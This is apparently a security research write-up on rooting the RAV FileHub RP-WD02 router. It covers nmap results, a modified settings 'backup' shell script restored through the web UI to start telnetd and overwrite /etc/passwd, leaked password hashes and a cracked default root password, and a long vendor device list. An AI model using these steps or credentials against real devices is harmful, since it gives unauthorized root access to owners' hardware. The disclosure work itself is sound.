# RAV

- [FileHub](#filehub)
  - [nmap](#nmap)
  - ['backup'](#backup)
- [other affected devices](#other-affected-devices)
- ['backup' strikes again](#backup-strikes-again)
  - [complete device list](#complete-device-list)

## FileHub
name|value
----|-----
model|RP-WD02
firmware|2.000.022
features|WiFi bridge, NAS, battery
app|[http://10.10.10.254](http://10.10.10.254)

if this looks familiar.. it's because it is - this particular model/firmware combination is running a very similar 'firmware' as the [HooToo](../hootoo) devices.

however, as noted in the upgrade saga there, none of these devices are _exactly_ the same

### nmap

initially, we see:

```
PORT   STATE SERVICE    VERSION
80/tcp open  http       lighttpd
81/tcp open  http       Web-Based Enterprise Management CIM serverOpenPegasus WBEM httpd
85/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

like the [HooToo](../hootoo), running 2 webservers on `80` and `81` and 'something' on `85`. when we plug a drive in, the NAS/NFS functionality lights up a few more ports:
```
TODO add this
```

### 'backup'

while looking through the web UI and comparing it to the [HooToo](../hootoo), i noticed a 'Backup Settings' option.

[http://device/sysfirm.csp?fname=sysbackupform&t=timestamp](http://10.10.10.254:81/sysfirm.csp?fname=sysbackupform&t=1467949779552) downloads a file:
```
-rw-r--r--@ 1 conor  staff   294956 Jul  7 19:30 fw_120101.bin.gz
```

~290k for vanilla settings?

```
$ file fw_120101.bin.gz
fw_120101.bin.gz: POSIX shell script text executable
$ head fw_120101.bin.gz
#!/bin/sh
tar etc package
CRCSUM1=589296398
etc/0000755000000000000000000000000011677736726010355 5ustar  rootrootetc/udhcpd.conf_bak0000644000000000000000000000022211677736726013304 0ustar  rootrootstart 10.10.10.1
end 10.10.10.50
interface br0
option subnet 255.255.255.0
option dns 10.10.10.254
option router 10.10.10.254
option lease 86400
```

well it's definitely more than just settings.


assuming that this was probably the same underlying system as the [HooToo](../hootoo), there should be some concept of `telnetd`. searching the file found code that appeared to be /etc/rc.d load scripts:
```shell
#Modify for 3G reset not Open
if [ ! -f /etc/checktelnetflag ]; then
	telnetd &
elif [ -f /etc/telnetflag ]; then
	telnetd &
fi
```

my first attempt was to modify the file to just include a blind run of `telnetd &`:

```
$ diff fw_120101.bin.gz fw_conor.bin.gz-telnetd-works --text
1688a1689
> telnetd &
```

this started telnet (after restoring the file through the same web UI used to back up the original)!

```
TODO fill in initial admin login here
```

using the same password for `admin` that is used in the web UI, i was able to login.


i looked, and  again, `/etc/passwd` and `/etc/shadow` were world readable. i took the contents to my trusty GCE v16 instance, and.. cracked the root password immediately.


yep, using the same root password has the [HooToo](../hootoo) devices here too: `20080826`


however, the `/etc/passwd` contents were not the same:
```
root:$1$yikWMdhq$cIUPc1dKQYHkkKkiVpM/v/:0:0:root:/root:/sbin/nologin
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
admin:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:15:0:admin:/data/UsbDisk1/Volume1:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
nobody:x:65534:65534:Nobody:/data/UsbDisk1/Volume1:/bin/sh
```

`root` has a login shell of `/sbin/nologin` - so even though we know the password, because this firmware doesn't have `sudo`, we can't get root access directly.


i changed tactics, and decided to just create the flagfile `/etc/telnetdflag`, assuming it was some dev trigger, especially after seeing:

```shell
if [ -f /etc/telnetflag ]; then
  sed -i "s|:/root:/sbin/nologin|:/root:/bin/sh|" /etc/passwd
#cp -f /etc/telnetpasswd /etc/passwd
#cp -f /etc/telnetshadow /etc/shadow
fi
```

aha! so not only will that file start `telnetd`, but it will also let us login. so, modify the 'backup' to just create that file instead:

```
diff fw_120101.bin.gz fw_conor.bin.gz-telnetd-works-but-root-still-has-nologin --text
1683a1684
> touch /etc/telnetflag
```

except.. after we restore this 'backup', we still can't login:

```
TODO add this
```

looking deeper, while the code had executed (`telnetd` was still running after all), it appears that the change for `/bin/sh` was applied to `/etc/telnetpasswd`, not `/etc/passwd`.

i uncommented the lines that copied one to the other, giving:

```
$ diff fw_120101.bin.gz fw_rooted.bin.gz --text
1683a1684
> touch /etc/telnetflag
2211,2212c2212,2213
<       #cp -f /etc/telnetpasswd /etc/passwd
<       #cp -f /etc/telnetshadow /etc/shadow
---
>       cp -f /etc/telnetpasswd /etc/passwd
>       cp -f /etc/telnetshadow /etc/shadow
3986,3987c3987,3988
< #     cp -f /etc/telnetpasswd /etc/passwd
< #     cp -f /etc/telnetshadow /etc/shadow
---
>       cp -f /etc/telnetpasswd /etc/passwd
>       cp -f /etc/telnetshadow /etc/shadow
```

and after applying, got to:

```
WD02 login: root
Password:
login: can't chdir to home directory '/root'
#
```

## other affected devices

while looking for `*.js` files used, i found the obviously interesting `config.js`. i was expecting configuration of the device, but what i found was the more obvious, configuration for the device:

```javascript
//泽宝RAV
var WD01 = {title:"RAVPower FileHub",services: ["win:Service_Win","skip:Service_SKIP"], language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",theme:"WD01",icons:"WD01_",hasRJ45:false};
var WD02 = {title:"RAV FileHub", language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",hasPPPoE:true,theme:"WD02",icons:"WD02_",hasRJ45:true,services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"]};
//HooToo
var TM01 = {language:["us","zh_CN","tr_CN"],title:"TripMate",theme:"TM01",hasWiFiMHZ:true,hasHideSSID:true,hasRJ45:true,hasPPPoE:true,helphtml: "help/{#lge}.html",icons:"TM01_",services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"],network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};
var TM02 = {title:"TripMate Nano", services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"],language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",theme:"TM02",icons:"TM02_",hasPPPoE:true};
var TM03 = {title:"TripMate Mini",services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"],language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",theme:"TM03",icons:"TM04_",hasPPPoE:true};
var TM04 = {title:"TripMate Elite",services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"],language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",theme:"TM04",icons:"TM04_",hasPPPoE:true};
```

given this, i think it's fair to assume that all of these devices listed [below](#complete-device-list) are equally vulnerable.

## 'backup' strikes again

kicking myself for missing the 'backup' vector when looking at the HooToo devices, i took another look - and no, there was no 'Backup / Restore Settings' option in the web UI.

remembering that a lot of the HooToo functionality lived behind `*.csp` `GET`s, it seemed reasonable that the backup method for the RAV-FileHub would also work for the HooToo devices. it [does](../hootoo)


### complete device list

99 devices, 69 manufacturers:

```javascript
...
//IOVST UIS700HD
var UIS700HD = { theme: "UIS700HD", title: "UIS700HD", hasPPPoE: true, language: ["zh_CN", "tr_CN", "us"],hotPlug: false ,services: ["win:Service_Win", "ext:Service_Ext"]};
//IOVST UIS700HD
var PA260s = { theme: "PA260s", title: "PA260s", language: ["zh_CN", "tr_CN", "us"],services: ["win:Service_Win", "ext:Service_Ext"], hasRJ45: false};
//IOVST PA520i
var PA520i = { language: ["zh_CN", "tr_CN", "us"], theme: "PA520i", title: "PA520i", has3G: true,hasPPPoE: true,services: ["win:Service_Win", "ext:Service_Ext"]};
var PA521i = { language: ["zh_CN", "tr_CN", "us"], theme: "PA521i", title: "PA521i", has3G: true,hasPPPoE: true,services: ["win:Service_Win", "ext:Service_Ext"]};
var AC01 = { language: ["zh_CN", "tr_CN", "us"], theme: "AC01", title: "AC01", has3G: true,hasPPPoE: true,services: ["win:Service_Win", "ext:Service_Ext"]};
var PA260si = { language: ["zh_CN", "tr_CN", "us"], theme: "PA260si", title: "PA260si", hasPPPoE: true, hasRJ45: true, has3G: true,services: ["win:Service_Win", "ext:Service_Ext"]};

//EAGET 忆捷 样式使用同一个 第一个是HDD 第二个是SD
var AirDisk = { language: ["zh_CN", "tr_CN", "us"],theme: "AirDisk", title: "Air Disk" ,hotPlug: false,hasPPPoE:true };
var A86 = {language: ["zh_CN", "tr_CN", "us"],theme:"A86",title:"A86",hotPlug:false,hasPPPoE:true,has3G:true,services: ["win:Service_Win","dlna:Service_DLNA"],helphtml: "help/{#lge}.html"};
//POWER7
var wifidisk = { language: allLges, theme: "wifidisk", title: "WiFi Disk", firmwareUrl: "www.part2.com",network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"],hotPlug: false  };
var WiFiSDRJ = { language: ["us", "zh_CN", "tr_CN", "ja_JP", "de_DE", "ko_KO", "ru_RU", "fr_FR"], theme: "WiFiSDRJ", title: "WiFiSDRJ",hasPPPoE: true, has3G: true, services: ["win:Service_Win","dlna:Service_DLNA"], firmwareUrl: "www.part2.com",network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};
var WiFiPort = { language: ["us", "zh_CN", "tr_CN", "ja_JP", "de_DE", "ko_KO", "ru_RU", "fr_FR"], theme: "WiFiPort", title: "WiFiPort",has3G: true, networkModeCanChange: false, firmwareUrl: "www.part2.com",network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"] };
var WiFiDGRJ = { language: allLges, theme: "WiFiDGRJ", title: "WiFiDGRJ", firmwareUrl: "www.part2.com",hasPPPoE: true,services: ["win:Service_Win","dlna:Service_DLNA"],network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"],has3G:true};
var WiFiMagic= { language: allLges, theme: "WiFiMagic", title: "WiFiMagic", firmwareUrl: "www.part2.com" ,network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};

//POWER7 wifi SD
var wifisd = { language: ["us", "zh_CN", "tr_CN", "ja_JP", "de_DE", "ko_KO", "ru_RU", "fr_FR"], theme: "wifisd", title: "WiFiSD", hasRJ45: false,has3G:true ,network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};
var DiskNORJ = { language: allLges, theme: "DiskNORJ", title: "DiskNORJ",hasRJ45: false, firmwareUrl: "www.part2.com",network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"] };
var WiFiDG = { language: allLges, theme: "WiFiDG", title: "WiFiDG",hasRJ45: false,has3G:true,network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"], firmwareUrl: "www.part2.com" };

//ALZX
var WiFimate = { language:["us", "zh_CN", "tr_CN"],theme: "WiFimate", title: "WiFimate",hotPlug: false  };

//OUO
var S60 = { language:["us", "zh_CN", "tr_CN"],theme: "S60", title: "S60" ,services: ["win:Service_Win","dlna:Service_DLNA"],hotPlug: false };

//Aigo
var aigoWiFiDisk = { theme: "aigoWiFiDisk", title: "WiFi Disk", defaultTab: "explorer", hasPPPoE: true, language: ["zh_CN", "tr_CN", "us"],hotPlug: false };
var aigoWiFiRouter = { theme: "aigoWiFiRouter", title: "aigo WiFi Router", defaultTab: "explorer", hasPPPoE: true, language: ["zh_CN", "tr_CN", "us"],hasRJ45: true };
var aigoWiFiSD = { theme: "aigoWiFiSD", title: "aigo WiFi SD", defaultTab: "explorer", language: ["zh_CN", "tr_CN", "us"],hasRJ45: true, hasPPPoE: true };
var PB106 = {language:["us","zh_CN","tr_CN"],theme:"PB106",title:"wifi Dangle",hasRJ45: false};
var MiniWiFiRouter = {language:["us","zh_CN","tr_CN"],theme:"MiniWiFiRouter",title:"aigo Mini WiFi Router",hasPPPoE: true};
var HD816 = { language:["us", "zh_CN", "tr_CN"],theme:"HD816",title:"WiFi Disk",hotPlug: false,hasRJ45: false};

// 日本 RATOC
// helphtml:"ja_JP_WIFISD1" 本客户中如果使用日文，单独使用独立的帮助文档
var WIFISD1 = { theme: "WIFISD1", title: "WiDrawer", hasRJ45: false, helphtml: "help.html", language: ["ja_JP", "us", "zh_CN", "tr_CN"],services: ["win:Service_Win"]};
var WIFIMSD1 = { theme: "WIFIMSD1", title: "WiDrawer", hasRJ45: true, helphtml: "help.html", language: ["ja_JP"],wifiChannel:[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]};

var WIFIUSB2 = { theme: "WIFIUSB2", title: "WiDrawer", hasRJ45: true, helphtml:"help/{#lge}.html", language: ["ja_JP"],services: ["win:Service_Win"]};
var WIFIUSB1 = { language:["ja_JP"],title:"WiDrawer",theme:"WIFIUSB1",hasRJ45: false,helphtml:"help/{#lge}.html"};

// RATOC的 NTT
  var SD1D = {title:"WiDrawer",language:["ja_JP","zh_CN","tr_CN","us"],helphtml: "help.html",hasRJ45: false,theme:"SD1D"};
//var WIFIUSB2 = { language:["ja_JP"],title:"WiDrawer",theme:"WIFIUSB2",helphtml:"help/{#lge}.html"};

//德国版本
var MWiD25 = { language: ["us", "de_DE"], theme: "MWiD25", title: "FANTEC MWiD25",firmwareUrl: "http://www.fantec.com" };

//德国2 Intenso
var M2M = { language: ["de_DE", "us","fr_FR","it_IT","po_PO","pu_PU","ru_RU","sp_SP"], theme: "M2M", title: "Memory 2 Move", dragType: "move",hotPlug: false,
  //特定帮助
  helphtml: "help/{#lge}.html",
  //服务设置
  services: ["win:Service_Win","dlna:Service_DLNA"],
  //网络设置
  network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]
};
var Reader = {language: ["de_DE", "us","fr_FR","it_IT","po_PO","pu_PU","ru_RU","sp_SP"],theme:"Reader",title:"WiFi Disk",hasRJ45:"true", dragType: "move",services: ["win:Service_Win","dlna:Service_DLNA"],helphtml: "help/{#lge}.html",network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};

//SXZ
var WI10 = { language: ["zh_CN", "tr_CN", "us"], theme: "WI10", title: "WI10",hotPlug: false  };

//OUO
var T30 = { language: ["zh_CN", "tr_CN", "us"], theme: "T30", title: "T30",  hasRJ45: false };

//MEGAGE
var A60 = { language: ["zh_CN", "tr_CN", "us"], theme: "A60", title: "Air Disk",hasRJ45: false };

//Leedo
var W3000P = { language: ["us", "zh_CN", "tr_CN"],theme: "W3000P", title: "Wi-Data",hotPlug: false  };

//Sarotech WiDisk
var WiDisk = { language: ["ko_KO", "zh_CN", "tr_CN", "us"], theme: "WiDisk", title: "Sarotech WiDisk", wifiPic: "ko" ,hotPlug: false };

//IPR115
var IPR115 = { language: ["us","it_IT","zh_CN", "tr_CN", "fr_FR","de_DE","ko_KO","pu_PU","sp_SP","du_DU"], theme: "IPR115", title: "POWAWIFI", helphtml: "help/{#lge}.html"};

//西班牙 HWD300
var HWD300 = { language: ["de_DE", "us", "zh_CN"], theme: "HWD300", title: "HWD 300 Help", firmwareUrl: "www.xoro.de" };

//Macally
var WIFIHDD = { language: ["us", "zh_CN", "tr_CN", "de_DE", "ko_KO", "fr_FR", "sp_SP", "du_DU", "it_IT"], theme: "WIFIHDD", title: "My WiFiDisk" ,hotPlug: false };
var MWiFiSD = { language: ["us", "zh_CN", "tr_CN", "de_DE", "ko_KO", "fr_FR", "sp_SP", "du_DU", "it_IT"], theme: "MWiFiSD", title: "My WiFiDisk", hasRJ45: false };

//Macway
var StorevaXAir = { language: ["fr_FR", "us"], theme:"StorevaXAir", title:"Storeva AirStor" ,hotPlug: false };

//创世达
var TPOSWiFiDisk = { language: ["zh_CN", "tr_CN", "us"], theme: "TPOSWiFiDisk", title: "TPOSWiFiDisk" };

//Sabaoth
var iStorageII = { language: ["zh_CN","us"],theme:"iStorageII",title:"WiFi WeStor"};

//Eagletec
var HDCWIFI = { language: ["zh_CN","us","tr_CN"],theme:"HDCWIFI",title:"Eagletec Wireless Drive",hotPlug: false};

//Storex
var WeZeeDisk = { language:["fr_FR","us"],theme:"WeZeeDisk",title:"WeZee Disk",hotPlug: false ,services:["win:Service_Win","dlna:Service_DLNA"],helphtml: "help/{#lge}.html"};
var WeZeeCard = {language:["fr_FR","us"],theme:"WeZeeCard",title:"WeZee Card",services:["win:Service_Win","dlna:Service_DLNA"]}

//Newsmy
var C2 = {language:["zh_CN","tr_CN","us"],theme:"C2",title:"NewDrive",hasPPPoE: true,hotPlug: false ,network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"],services: ["win:Service_Win"],helphtml:"help/{#lge}.html"};

//FANTEC
var MWiD25DS = { language:["us","de_DE"],theme:"MWiD25DS",title:"FANTEC MWiD25DS",services: ["win:Service_Win"],helphtml: "help/us.html"};

//NEXTAV
var H100 = {language:["us","tr_CN","zh_CN","fr_FR","de_DE","ko_KO"],title:"NEXTAV WiFi Drive",theme:"H100",firmwareUrl:"www.nextav.ca",hotPlug: false};
var D100 = {language:["us","tr_CN","zh_CN","fr_FR","de_DE","ko_KO"],title:"NEXTAV WiFi Drive",theme:"D100",firmwareUrl:"www.nextav.ca",hasRJ45: false};
var S100 = {language:["us","tr_CN","zh_CN","fr_FR","de_DE","ko_KO","ru_RU"],title:"NEXTAV WiFi Drive",theme:"S100",services:["win:Service_Win","dlna:Service_DLNA"],firmwareUrl:"www.nextav.ca",helphtml: "help/{#lge}.html"};
//IOGEAR
var GWFRSDU = {language:["us","tr_CN","zh_CN"],title:"MediaShair Hub",theme:"GWFRSDU"};

//Verbatim
var MediaShare = {language: ["zh_CN", "tr_CN", "us"],theme:"MediaShare",title:"Wifi disk",hasRJ45:false,network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};

//Futurepath
var WMC_i22 = {language:["us","zh_CN","tr_CN","ja_JP","de_DE","ko_KO","ru_RU","fr_FR","pu_PU","sp_SP","du_DU","it_IT"],theme:"WMC_i22",title:"FP-WiFi Disk",hasRJ45:false};
var WMC_i21 = {language:["us","zh_CN","tr_CN","ja_JP","de_DE","ko_KO","ru_RU","fr_FR","pu_PU","sp_SP","du_DU","it_IT"],theme:"WMC_i21",title:"FP-WiFi Disk",hasRJ45:true};

//Lenovo
var LeDisk= {language:["us","zh_CN","tr_CN"],theme:"LeDisk",title:"Lenovo WiFi Disk",hasRJ45:true,hasPPPoE: true,hotPlug: false,services: ["win:Service_Win","dlna:Service_DLNA"],helphtml: "help/{#lge}.html"};

//I-O DATA
var WFSSR01 = {language:["ja_JP"], theme:"WFSSR01", title:"WFS-SR01",helphtml: "help/{#lge}.html"};
var WFSCSR01 = {language:["tr_CN","zh_CN","us","ja_JP"],title:"WFS-CSR01",theme:"WFSCSR01",helphtml: "help/{#lge}.html"};

//Maxwave
var EZCH31 = {language:["us"], theme:"EZCH31", title:"WiFi Disk"};

//PEARL
var PX4854 = {language:["de_DE","fr_FR","us"], theme:"PX4854", title:"7links WLAN-Speicheradapter",hasRJ45:false,helphtml: "help/{#lge}.html",firmwareUrl: "http://www.pearl.de"};
var PX4893 = {language:["de_DE","fr_FR","us"], theme:"PX4893", title:"7links WLAN-Speicheradapter",hasRJ45:false,helphtml: "help/{#lge}.html",firmwareUrl: "http://www.pearl.de"};

//3Q ["zh_CN", "tr_CN", "us", "fr_FR", "de_DE", "ru_RU", "pu_PU", "sp_SP", "du_DU", "it_IT"]
var WHL220M = {language:["us","ru_RU"] ,hotPlug:false,theme:"WHL220M",title:"3Q WiFi Disk Manager",helphtml: "help/{#lge}.html",firmwareUrl: "www.3Q-int.com"}

//MEDION
var WLAN_HDD_N_GO = { language: ["us","fr_FR","de_DE","du_DU","pu_PU","sp_SP","it_IT","dk_DK"], theme: "WLAN_HDD_N_GO", title: "WLAN HDD N GO",hasRJ45: false,icons:"WLAN_HDD_N_GO_",network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]}
var WLAN_HDD = { language: ["us","fr_FR","de_DE","du_DU","pu_PU","sp_SP","it_IT","dk_DK"], theme: "WLAN_HDD", title: "Medion WLAN HDD",icons:"WLAN_HDD_",network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"], hotPlug:false};

//TrekStor
var DSPA =  {title: "pocket air", theme: "DSPA", language:["us","de_DE"], hotPlug:false,icons:"DSPA_",helphtml: "help/{#lge}.html",network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};

//IOVST
var PA260si_OEM ={ language: ["zh_CN", "tr_CN", "us"], theme:"PA260si_OEM", title: "WiFiDisk", has3G: true,hasPPPoE: true,services: ["win:Service_Win"]};
var PA521i_OEM = { language: ["zh_CN", "tr_CN", "us"], theme:"PA521i_OEM", title: "WiFiDisk", has3G: true, hasPPPoE: true,services: ["win:Service_Win"]};

//Hama
var HamaWiFi = {language:["us","fr_FR","de_DE","sp_SP"],theme:"HamaWiFi",title:"Wi-Fi Data Reader",helphtml: "help/{#lge}.html",hasRJ45:false};

  //RoitsNine
var SVWIFIS250UN = {language:["us","ko_KO"],theme:"SVWIFIS250UN",title:"S-view WiFi",hasPPPoE: true,hotPlug:false,services:["win:Service_Win","dlna:Service_DLNA"]};
var SVWIFID24U = {language:["us","ko_KO"],theme:"SVWIFID24U",hasPPPoE: true,title:"S-view WiFi",services: ["win:Service_Win","dlna:Service_DLNA"]};

//IVT
var S3 = {language:["zh_CN", "tr_CN", "us"],theme:"S3",title:"IVT SMART CLOUD",hasPPPoE: true,services: ["win:Service_Win","dlna:Service_DLNA"]};

//Princeton
var WMS1 = {language:["ja_JP","us"], theme:"WMS1", title:"ShAirDisk",helphtml: "help.html"};

//POWSON
var POWSON = {title:"POWSON WiFi Disk", language:["us","zh_CN","tr_CN"], theme:"POWSON",hasPPPoE: true, hotPlug:false};

//EDUP
var EP3701 = {title:"EDUP WIFI Disk", language:["tr_CN","zh_CN","us","fr_FR","de_DE","ko_KO","pu_PU","sp_SP","du_DU","it_IT"],services: ["win:Service_Win","dlna:Service_DLNA"], theme:"EP3701",hasRJ45: false};

//SSK
var SSK = {title:"SSK WIFI DISK", language:["tr_CN","zh_CN","us"],hasPPPoE: true, theme:"SSK",icons:"SSK_"};
var HE_W100 = {title:"SSK WIFI DISK", language:["tr_CN","zh_CN","us"],hasPPPoE: true, theme:"HE_W100",icons:"HE_W100_"};

  //FG1060N
var FG1060N = {title:"LifetronsAir", language:["us","zh_CN","tr_CN","ja_JP","de_DE","ko_KO","fr_FR","sp_SP","it_IT"],hasPPPoE: true,has3G:true, theme:"FG1060N",helphtml: "help/{#lge}.html",icons: "FG1060N_",firmwareUrl : "www.lifetrons.com"};

  //Onion
var iAirDisk = {title:"Air Disk", language:["tr_CN","zh_CN","us"],hasPPPoE: true, theme:"iAirDisk"};

//Sarotech
var WFABU2 = {title:"Sarotech WiDisk", language:["us","zh_CN","tr_CN","ko_KO"], theme:"WFABU2"};

//Valence
var MicroSD = {title:"Valence iCloud", language:["tr_CN","zh_CN","us"],hasPPPoE: true, theme:"MicroSD"};

//泽宝RAV
var WD01 = {title:"RAVPower FileHub",services: ["win:Service_Win","skip:Service_SKIP"], language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",theme:"WD01",icons:"WD01_",hasRJ45:false};
var WD02 = {title:"RAV FileHub", language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",hasPPPoE:true,theme:"WD02",icons:"WD02_",hasRJ45:true,services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"]};
//HooToo
var TM01 = {language:["us","zh_CN","tr_CN"],title:"TripMate",theme:"TM01",hasWiFiMHZ:true,hasHideSSID:true,hasRJ45:true,hasPPPoE:true,helphtml: "help/{#lge}.html",icons:"TM01_",services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"],network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};
var TM02 = {title:"TripMate Nano", services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"],language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",theme:"TM02",icons:"TM02_",hasPPPoE:true};
var TM03 = {title:"TripMate Mini",services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"],language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",theme:"TM03",icons:"TM04_",hasPPPoE:true};
var TM04 = {title:"TripMate Elite",services: ["win:Service_Win","dlna:Service_DLNA","skip:Service_SKIP"],language:["zh_CN","tr_CN","us","fr_FR","de_DE","sp_SP","it_IT"],helphtml: "help/{#lge}.html",theme:"TM04",icons:"TM04_",hasPPPoE:true};
//Choton 中创
var WiCloud = {title:"WiCloud",language:["zh_CN","tr_CN","us","fr_FR","de_DE","ko_KO","pu_PU","du_DU","sp_SP","it_IT"],network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"],services: ["win:Service_Win","dlna:Service_DLNA"],theme:"WiCloud",hasPPPoE:true};

//DAHENG 大恒
var DH_3000WIFI = {theme:"DH_3000WIFI",title:"DAHENG WIFI",language:["zh_CN","tr_CN","us","fr_FR","de_DE","ko_KO","sp_SP","it_IT"],services: ["win:Service_Win","dlna:Service_DLNA"],hasPPPoE:true,has3G:true};

//PNY
var PNYMediaReader = {theme:"PNYMediaReader",title:"PNY Wireless Media Reader",language:["us","zh_CN","tr_CN","fr_FR","de_DE","ru_RU","pu_PU","sp_SP","du_DU","it_IT"],services: ["win:Service_Win","dlna:Service_DLNA"],hasRJ45: false};

//Merlin Digital 的 WifiHDD
var WifiStorage = {theme:"WifiStorage",title:"WiFi Disk",language:["us"],hotPlug:false,hasPPPoE:true};

//Gigastone
var Gigastone = { language: allLges, theme: "Gigastone", title: "Gigastone",has3G: true,hasPPPoE:true,network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};
var A3  = {language: ["us","zh_CN","tr_CN","ja_JP","de_DE","ko_KO","ru_RU","fr_FR","pu_PU","sp_SP","du_DU","it_IT"], theme: "A3",title: "A3",has3G: true,hasPPPoE:true,network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"],services: ["win:Service_Win","dlna:Service_DLNA"]};
var A5  = {language: ["us","zh_CN","tr_CN","ja_JP","de_DE","ko_KO","ru_RU","fr_FR","pu_PU","sp_SP","du_DU","it_IT"], theme: "A5",title: "A5",has3G: true,hasPPPoE:true,network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"],services: ["win:Service_Win","dlna:Service_DLNA"]};

//SAVITMICRO
var DataMoreC52 = {language:["ko_KO","zh_CN","tr_CN","us","fr_FR","de_DE","ja_JP","ru_RU","po_PO","sp_SP","du_DU","it_IT"],theme:"DataMoreC52",title:"DataMore C Disk",services: ["win:Service_Win","dlna:Service_DLNA"],network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};

//Essentielb
var SoftMouv = {language:["fr_FR","us"], theme: "SoftMouv", title:"Essentiel b Soft'Mouv", services: ["win:Service_Win","dlna:Service_DLNA"], hotPlug: false,hasPPPoE: true,helphtml: "help/{#lge}.html"};

//Aukey
var WD_N1 = {language:["zh_CN","us","fr_FR","de_DE","ja_JP","sp_SP","it_IT"],theme: "WD_N1", title:"Aukey TripLink", has3G: true, hasPPPoE:true, helphtml: "help/{#lge}.html", services: ["win:Service_Win","dlna:Service_DLNA"], network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};
var WD_N2 = {language:["zh_CN","us","fr_FR","de_DE","ja_JP","sp_SP","it_IT"],theme: "WD_N2", title:"Aukey TripLink", has3G: true, hasPPPoE:true, helphtml: "help/{#lge}.html", services: ["win:Service_Win","dlna:Service_DLNA"], network: ["host:Setting_HostName", "wifi:Setting_Network_WiFiLAN", "dhcp:Setting_Network_DHCPServer", "internet:Setting_Network_Internet"]};
```
